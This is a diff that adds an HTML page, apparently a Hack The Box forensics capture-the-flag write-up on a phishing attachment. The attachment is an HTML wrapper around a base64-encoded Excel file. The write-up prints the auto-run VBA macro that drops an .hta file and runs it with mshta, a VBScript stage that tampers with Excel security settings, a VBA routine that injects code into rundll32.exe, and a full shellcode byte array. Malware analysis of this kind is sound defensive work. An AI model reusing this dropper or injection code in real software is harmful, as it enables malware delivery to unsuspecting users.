@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<!--
+==============================================================================
+                GitHub HTML Pandoc Template — by Apehex
+==============================================================================
+Copyright (c) Apehex, 2021, MIT License (MIT).
+
+- https://github.com/apehex/homesick
+
+Forked from "pandoc-goodies" by Tristano Ajmone:
+
+- https://github.com/tajmone/pandoc-goodies
+
+The CSS in this template reuses source code taken from the following projects:
+
+- GitHub Markdown CSS: Copyright © Sindre Sorhus, MIT License (MIT):
+  https://github.com/sindresorhus/github-markdown-css
+
+- Primer CSS: Copyright © 2016-2017 GitHub Inc., MIT License (MIT):
+  http://primercss.io/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+The MIT License
+
+Copyright (c) Apehex, 2021 (github.com/apehex/homesick)
+Copyright (c) Tristano Ajmone, 2017-2020 (github.com/tajmone/pandoc-goodies)
+Copyright (c) Sindre Sorhus <sindresorhus@gmail.com> (sindresorhus.com)
+Copyright (c) 2017 GitHub Inc.
+
+"GitHub Pandoc HTML5 Template" is Copyright (c) Tristano Ajmone, 2017-2020,
+released under the MIT License (MIT); it contains readaptations of substantial
+portions of the following third party softwares:
+
+(1) "GitHub Markdown CSS", Copyright (c) Sindre Sorhus, MIT License (MIT).
+(2) "Primer CSS", Copyright (c) 2016 GitHub Inc., MIT License (MIT).
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+==============================================================================-->
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title> oBfsC4t10n</title>
+  <style type="text/css">
+@charset "UTF-8";.markdown-body{-webkit-print-color-adjust: exact;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;color: #24292e;font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI",Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji","Segoe UI Symbol";font-size: 16px;line-height: 1.5;word-wrap: break-word;box-sizing: border-box;min-width: 200px;max-width: 96%;margin: 0 auto;padding: 45px}.markdown-body a{color: #0366d6;background-color: transparent;text-decoration: none;-webkit-text-decoration-skip: objects}.markdown-body a:active,.markdown-body a:hover{outline-width: 0}.markdown-body a:hover{text-decoration: underline}.markdown-body a:not([href]){color: inherit;text-decoration: none}.markdown-body strong{font-weight: 600}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top: 24px;margin-bottom: 16px;font-weight: 600;line-height: 1.25}.markdown-body h1{font-size: 2em;margin: 0.67em 0;padding-bottom: 0.3em;border-bottom: 1px solid #eaecef}.markdown-body h2{padding-bottom: 0.3em;font-size: 1.5em;border-bottom: 1px solid #eaecef}.markdown-body h3{font-size: 1.25em}.markdown-body h4{font-size: 1em}.markdown-body h5{font-size: 0.875em}.markdown-body h6{font-size: 0.85em;color: #6a737d}.markdown-body img{border-style: none}.markdown-body svg:not(:root){overflow: hidden}.markdown-body hr{box-sizing: content-box;height: 0.25em;margin: 24px 0;padding: 0;overflow: hidden;background-color: #e1e4e8;border: 0}.markdown-body hr::before{display: table;content: ""}.markdown-body hr::after{display: table;clear: both;content: ""}.markdown-body input{margin: 0;overflow: visible;font: inherit;font-family: inherit;font-size: inherit;line-height: inherit}.markdown-body [type="checkbox"]{box-sizing: border-box;padding: 0}.markdown-body *{box-sizing: border-box}.markdown-body blockquote{margin: 0}.markdown-body ol,.markdown-body ul{padding-left: 2em}.markdown-body ol ol,.markdown-body ul ol{list-style-type: lower-roman}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top: 0;margin-bottom: 0}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type: lower-alpha}.markdown-body li > p{margin-top: 16px}.markdown-body li li{margin-top: 0.25em}.markdown-body dd{margin-left: 0}.markdown-body dl{padding: 0}.markdown-body dl dt{padding: 0;margin-top: 16px;font-size: 1em;font-style: italic;font-weight: 600}.markdown-body dl dd{padding: 0 16px;margin-bottom: 16px}.markdown-body code{font-family: SFMono-Regular, Consolas, "Liberation Mono", Menlo, Courier,monospace}.markdown-body pre{font: 12px SFMono-Regular, Consolas, "Liberation Mono", Menlo, Courier,monospace;word-wrap: normal}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top: 0;margin-bottom: 16px}.markdown-body blockquote{padding: 0 1em;color: #6a737d;border-left: 0.25em solid #dfe2e5}.markdown-body blockquote > :first-child{margin-top: 0}.markdown-body blockquote > :last-child{margin-bottom: 0}.markdown-body table{display: block;width: 100%;overflow: auto;border-spacing: 0;border-collapse: collapse}.markdown-body table th{font-weight: 600}.markdown-body table td,.markdown-body table th{padding: 6px 13px;border: 1px solid #dfe2e5}.markdown-body table tr{background-color: #fff;border-top: 1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color: #f6f8fa}.markdown-body img{max-width: 100%;box-sizing: content-box;background-color: #fff}.markdown-body code{padding: 0.2em 0;margin: 0;font-size: 85%;background-color: rgba(27, 31, 35, 0.05);border-radius: 3px}.markdown-body code::after,.markdown-body code::before{letter-spacing: -0.2em;content: " "}.markdown-body pre > code{padding: 0;margin: 0;font-size: 100%;word-break: normal;white-space: pre;background: 0 0;border: 0}.markdown-body .highlight{margin-bottom: 16px}.markdown-body .highlight pre{margin-bottom: 0;word-break: normal}.markdown-body .highlight pre,.markdown-body pre{padding: 16px;overflow: auto;font-size: 85%;line-height: 1.45;background-color: #f6f8fa;border-radius: 3px}.markdown-body pre code{display: inline;max-width: auto;padding: 0;margin: 0;overflow: visible;line-height: inherit;word-wrap: normal;background-color: transparent;border: 0}.markdown-body pre code::after,.markdown-body pre code::before{content: normal}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color: #005cc5;border-color: #005cc5}.markdown-body kbd{box-shadow: inset 0 -1px 0 #959da5;display: inline-block;padding: 3px 5px;font: 11px/10px SFMono-Regular, Consolas, "Liberation Mono", Menlo, Courier,monospace;color: #444d56;vertical-align: middle;background-color: #fcfcfc;border: 1px solid #c6cbd1;border-bottom-color: #959da5;border-radius: 3px;box-shadow: inset 0 -1px 0 #959da5}.markdown-body :checked .radio-label{position: relative;z-index: 1;border-color: #0366d6}.markdown-body .task-list-item{list-style-type: none}.markdown-body .task-list-item .task-list-item{margin-top: 3px}.markdown-body .task-list-item input{margin: 0 0.2em 0.25em -1.6em;vertical-align: middle}.markdown-body::before{display: table;content: ""}.markdown-body::after{display: table;clear: both;content: ""}.markdown-body > :first-child{margin-top: 0 !important}.markdown-body > :last-child{margin-bottom: 0 !important}.Alert,.Error,.Note,.Success,.Warning{padding: 11px;margin-bottom: 24px;border-style: solid;border-width: 1px;border-radius: 4px}.Alert p,.Error p,.Note p,.Success p,.Warning p{margin-top: 0}.Alert p:last-child,.Error p:last-child,.Note p:last-child,.Success p:last-child,.Warning p:last-child{margin-bottom: 0}.Alert{color: #246;background-color: #e2eef9;border-color: #bac6d3}.Warning{color: #4c4a42;background-color: #fff9ea;border-color: #dfd8c2}.Error{color: #911;background-color: #fcdede;border-color: #d2b2b2}.Success{color: #22662c;background-color: #e2f9e5;border-color: #bad3be}.Note{color: #2f363d;background-color: #f6f8fa;border-color: #d5d8da}.Alert h1,.Alert h2,.Alert h3,.Alert h4,.Alert h5,.Alert h6{color: #246;margin-bottom: 0}.Warning h1,.Warning h2,.Warning h3,.Warning h4,.Warning h5,.Warning h6{color: #4c4a42;margin-bottom: 0}.Error h1,.Error h2,.Error h3,.Error h4,.Error h5,.Error h6{color: #911;margin-bottom: 0}.Success h1,.Success h2,.Success h3,.Success h4,.Success h5,.Success h6{color: #22662c;margin-bottom: 0}.Note h1,.Note h2,.Note h3,.Note h4,.Note h5,.Note h6{color: #2f363d;margin-bottom: 0}.Alert h1:first-child,.Alert h2:first-child,.Alert h3:first-child,.Alert h4:first-child,.Alert h5:first-child,.Alert h6:first-child,.Error h1:first-child,.Error h2:first-child,.Error h3:first-child,.Error h4:first-child,.Error h5:first-child,.Error h6:first-child,.Note h1:first-child,.Note h2:first-child,.Note h3:first-child,.Note h4:first-child,.Note h5:first-child,.Note h6:first-child,.Success h1:first-child,.Success h2:first-child,.Success h3:first-child,.Success h4:first-child,.Success h5:first-child,.Success h6:first-child,.Warning h1:first-child,.Warning h2:first-child,.Warning h3:first-child,.Warning h4:first-child,.Warning h5:first-child,.Warning h6:first-child{margin-top: 0}h1.title,p.subtitle{text-align: center}h1.title.followed-by-subtitle{margin-bottom: 0}p.subtitle{font-size: 1.5em;font-weight: 600;line-height: 1.25;margin-top: 0;margin-bottom: 16px;padding-bottom: 0.3em}div.line-block{white-space: pre-line}
+  </style>
+  <style type="text/css">code{white-space: pre;}</style>
+  <style type="text/css">
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    color: #aaaaaa;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+code span.at { color: #7d9029; } /* Attribute */
+code span.bn { color: #40a070; } /* BaseN */
+code span.bu { color: #008000; } /* BuiltIn */
+code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #4070a0; } /* Char */
+code span.cn { color: #880000; } /* Constant */
+code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+code span.dt { color: #902000; } /* DataType */
+code span.dv { color: #40a070; } /* DecVal */
+code span.er { color: #ff0000; font-weight: bold; } /* Error */
+code span.ex { } /* Extension */
+code span.fl { color: #40a070; } /* Float */
+code span.fu { color: #06287e; } /* Function */
+code span.im { color: #008000; font-weight: bold; } /* Import */
+code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+code span.op { color: #666666; } /* Operator */
+code span.ot { color: #007020; } /* Other */
+code span.pp { color: #bc7a00; } /* Preprocessor */
+code span.sc { color: #4070a0; } /* SpecialChar */
+code span.ss { color: #bb6688; } /* SpecialString */
+code span.st { color: #4070a0; } /* String */
+code span.va { color: #19177c; } /* Variable */
+code span.vs { color: #4070a0; } /* VerbatimString */
+code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<article class="markdown-body">
+<header>
+<h1 class="title"> oBfsC4t10n</h1>
+</header>
+<blockquote>
+<p>This document came in as an email attachment. Our SOC tells us that
+they think there were some errors in it that caused it not to execute
+correctly. Can you figure out what the command and control mechanism
+would have been had it worked?</p>
+</blockquote>
+<blockquote>
+<p>Author: <strong><a
+href="https://app.hackthebox.com/users/4935">0xdf</a></strong></p>
+</blockquote>
+<h2 id="meta">Meta</h2>
+<p>Windows Defender, Ad-Aware and a few others flag the file as a
+“generic trojan”.</p>
+<p><code>trid</code>, <code>file</code>, <code>exiftool</code> return
+nothing.</p>
+<h2 id="unpacking">Unpacking</h2>
+<p>The html file is a wrapper for a base64 encoded xls document, located
+inside a malicious anchor tag.</p>
+<p>It can be extracted with:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> invoice-42369643.html <span class="kw">|</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>  <span class="fu">perl</span> <span class="at">-ne</span> <span class="st">&#39;m#base64,([a-zA-Z0-9/=+]+)\&quot;#g &amp;&amp; print $1&#39;</span> <span class="kw">|</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="fu">base64</span> <span class="at">-d</span> <span class="op">&gt;</span> invoice-42369643.xlsm</span></code></pre></div>
+<p>Next, we extract the macros from the resulting office document:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">olevba2</span> <span class="at">--deobf</span> <span class="at">--decode</span> <span class="at">--reveal</span> invoice-42369643.xlsm <span class="op">&gt;</span> macros.dump</span></code></pre></div>
+<p><strong>Note</strong>: I had encoding issues with Sublime Text. When
+copy / pasting, sections would disappear. The output from olevba was
+encoded as “Western (Windows 1252)”, but it should be changed to
+UTF-8.</p>
+<blockquote>
+<p>Set the macros encoding to <code>UTF-8</code></p>
+</blockquote>
+<pre><code>+----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
+|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA obfuscated      |VBA string expressions were detected, may be |
+|          |Strings             |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |LwTHLrGh.hta        |Executable file name                         |
+|Hex String|&#39;\x00\x02\x08\x19&#39;  |00020819                                     |
+|Hex String|&#39;\x00\x00\x00\x00\x0|000000000046                                 |
+|          |0F&#39;                 |                                             |
+|Hex String|&#39;\x00\x02\x08 &#39;     |00020820                                     |
+|Hex String|&#39;\x16QPr&#39;           |16515072                                     |
+|Hex String|&#39;\x16q\x16\x80&#39;     |16711680                                     |
+|Hex String|&#39;\xbf\xf2p\xcf&#39;     |BFF270CF                                     |
+|Hex String|&#39;O\x12\x00vN\xde&#39;   |4F1200764EDE                                 |
+|Hex String|&#39;\x0c\x82*\xf2&#39;     |0C822AF2                                     |
+|Hex String|&#39;\xff\x97\x1f\x81&lt;r&#39;|FF971F813C72                                 |
+|Base64    |&#39;$\xbak\xae\x91k&#39;   |JLprrpFr                                     |
+|String    |                    |                                             |
+|Base64    |&#39;Q\x97\\Q\x07\x89&#39;  |UZdcUQeJ                                     |
+|String    |                    |                                             |
+|VBA string|&#39;\x00&#39;              |Chr(0)                                       |
+|VBA string|&#39;$\xbak\xae\x91k&#39;   |Goto (&quot;JLprrpFr&quot;)                            |
+|VBA string|%temp%\LwTHLrGh.hta |Environ(&quot;temp&quot;) &amp; &quot;\LwTHLrGh.hta&quot;            |
+|VBA string|mshta               |&quot;msh&quot; &amp; &quot;ta &quot;                                |
++----------+--------------------+---------------------------------------------+</code></pre>
+<p>At this point there are several tactics:</p>
+<ul>
+<li>rework the VBA and understand its logic?</li>
+<li>find out the IO and trace the calls in Excel / LibreOffice?</li>
+<li>rewrite the scripts in another language and run it?</li>
+</ul>
+<p>I’ll start with reading the VBA macro to understand the overall
+logic, and then reproduce the functionality.</p>
+<h2 id="the-macros-logic">The macro’s logic</h2>
+<p>The <code>Auto_Open</code> function is at the root of the
+process:</p>
+<pre class="shell"><code>Sub Auto_Open()
+    Dim fHdswUyK, GgyYKuJh
+    Application.Goto (&quot;JLprrpFr&quot;)
+    GgyYKuJh = Environ(&quot;temp&quot;) &amp; &quot;\LwTHLrGh.hta&quot;
+    
+    Open GgyYKuJh For Output As #1
+    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText &amp; UZdcUQeJ.yTJtzjKX &amp; Selection)
+    Close #1
+    
+    fHdswUyK = &quot;msh&quot; &amp; &quot;ta &quot; &amp; GgyYKuJh
+    x = Shell(fHdswUyK, 1)
+End Sub</code></pre>
+<p>It performs the following operations:</p>
+<ul>
+<li>select the cell “JLprrpFr”, located in K2:
+<code>Application.Goto ("JLprrpFr")</code></li>
+<li>select the output path, in the temp directory:
+<code>GgyYKuJh = Environ("temp") &amp; "\LwTHLrGh.hta"</code></li>
+<li>concatenate 3 strings:
+<ul>
+<li><code>ActiveSheet.Shapes(2).AlternativeText</code>, the description
+/ alt text of the Excel logo in the worksheet</li>
+<li><code>UZdcUQeJ.yTJtzjKX</code> is a glocal string variable</li>
+<li>the content of the selected cell, “JLprrpFr”</li>
+</ul></li>
+<li><code>hdYJNJmt</code> somehow transforms the whole string into a
+meaningful format</li>
+<li>its output is then written to the <code>.hta</code> file</li>
+<li>execute the file</li>
+</ul>
+<p>The dead cell is slightly visible thanks to an arrow, in the
+spreadsheet.</p>
+<p>So, the actual payload is:</p>
+<ul>
+<li>split in 3 parts scattered around the document</li>
+<li>encoded with an unknown scheme</li>
+<li>executed with the command <code>mshta</code></li>
+</ul>
+<h2 id="piecing-the-payload-together">Piecing the payload together</h2>
+<p>Rather than executing the payload, let’s decode it.</p>
+<p>Excel macros don’t run perfectly in LibreOffice: for example, I had
+to manually search for the
+<code>ActiveSheet.Shapes(2).AlternativeText</code>, because it’s a
+description in LibreOffice.</p>
+<p>I had already found the 2 other parts So I extracted &amp;
+concatenated the obfuscated payload parts beforehand.</p>
+<pre class="shell"><code>output_file_path = &quot;/root/workspace/ctf/hackthebox/forensics/obfsc4t10n/payload.hta&quot;
+p1 = &quot;PGh0bWw+PGhlYWQ+PHNjcmlwdCBsYW5ndWFnZT0idmJzY3JpcHQiPgpEaW0gb2JqRXhjZWwsIF...&quot;
+p2 = &quot;lvbk5hbWUgIiYiQXMgU3RyaW4iJiJnIiZDaHIoNDQpJiIgQnlWYWwgbCImInBDb21tYW5kIiYi...&quot;
+p3 = &quot;ciJkNocig0NCkmQ2hyKDQ1KSYiNzkiJiBfIApDaHIoNDQpJiIxMTYiJkNocig0NCkmIjk0IiZD...&quot;
+
+Open output_file_path For Output As #1
+Write #1, deobfuscate(p1 &amp; p2 &amp; p3)
+Close #1
+
+payload = &quot;mshta &quot; &amp; output_file_path
+&#39;x = Shell(payload, 1)</code></pre>
+<p>It results in an “hta” file: MS HTML application, which is actually
+plain VBScript.</p>
+<pre class="shell"><code>Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
+
+Set objExcel = CreateObject(&quot;Excel.Application&quot;)
+objExcel.Visible = False
+
+Set WshShell = CreateObject(&quot;Wscript.Shell&quot;)
+
+function RegExists(regKey)
+        on error resume next
+        WshShell.RegRead regKey
+        RegExists = (Err.number = 0)
+end function
+...</code></pre>
+<h2 id="defragmentating-the-nested-payload">Defragmentating the nested
+payload</h2>
+<p>The former macro payload encapsulates yet another obfuscated
+payload!</p>
+<p>The logic of the new script is:</p>
+<ul>
+<li>first disable the “Trust access for VBA” in Excel</li>
+<li>create <em>another</em> Excel workbook</li>
+<li>inject some payload</li>
+<li>disable the alerts</li>
+<li>run the injected code</li>
+<li>close Excel while keeping the workbook running</li>
+<li>restore the Windows registry</li>
+</ul>
+<p>And the new payload is another weird string:</p>
+<pre><code>&quot;Private &quot;&amp;&quot;Type PRO&quot;&amp;&quot;CESS_INF&quot;&amp;&quot;ORMATION&quot;&amp;Chr(10)&amp;&quot;    hPro&quot;&amp;&quot;cess As &quot;&amp;&quot;Long&quot;&amp;Chr(10)&amp;&quot;    hThr&quot;&amp;&quot;ead As L&quot;&amp;&quot;ong&quot;&amp;Chr(10)...</code></pre>
+<p>It’s just a fragmented string with characters expressed as ASCII
+numbers.</p>
+<p>The syntax is very close to a Python string, with a few adjustements
+we get the full picture.</p>
+<p>It is a VBA script which performs a PE injection on
+“rundll32.exe”:</p>
+<pre class="shell"><code>If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then
+        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;
+    Else
+        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;
+    End If
+
+    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)
+
+    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
+    For offset = LBound(myArray) To UBound(myArray)
+        myByte = myArray(offset)
+        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
+    Next offset
+    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</code></pre>
+<h2 id="debugging-the-shellcode">Debugging the shellcode</h2>
+<p>“rundll32.exe” is meant to execute the following shellcode:</p>
+<pre class="vba"><code>myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,-61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127,-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116,-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8,-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119,-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123,-80,-4,-128,-43,27,-96,36,-99,-79,-75,84,-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50,-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102,-116,-15,-124,-37,110,-109,-112,-117,-26,97,-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31,-105,-98,-92,60,-46,-95,47,-76,34,111,-40,-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47,-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85,-113,-75,-75,6,-86,-71,99,59,103,44,-116,109,-37,-25,-28,-109,2,-49,-86,108,97,83,-84,-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11,-110,122,-110,-6,82,-126,57,83,-6,9,-84,17,-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116,-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78)</code></pre>
+<p>This array can be converted to unsigned bytes with:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;payload.bin&#39;</span>, <span class="st">&#39;wb&#39;</span>) <span class="im">as</span> _f:</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    _f.write(<span class="bu">bytes</span>([_b <span class="op">&amp;</span> <span class="bn">0xff</span> <span class="cf">for</span> _b <span class="kw">in</span> BYTES]))</span></code></pre></div>
+<p>The shellcode itself would be very tiresome to analyse
+statically.</p>
+<p>Instead, <code>blobrunner</code> can inject shellcode in itself! Now
+we can debug blobrunner while it triggers the shellcode:</p>
+<p><img src="images/debugging-shellcode.png" /></p>
+<p>The code contains a loop (see EIP above) modifying the rest of the
+payload!</p>
+<p>The resulting bytes make no sense when interpreted as assembly, it’s
+plain ASCII:</p>
+<blockquote>
+<p><code>HTB{g0_G3t_th3_ph1sh3R}</code></p>
+</blockquote>
+</article>
+</body>
+</html>
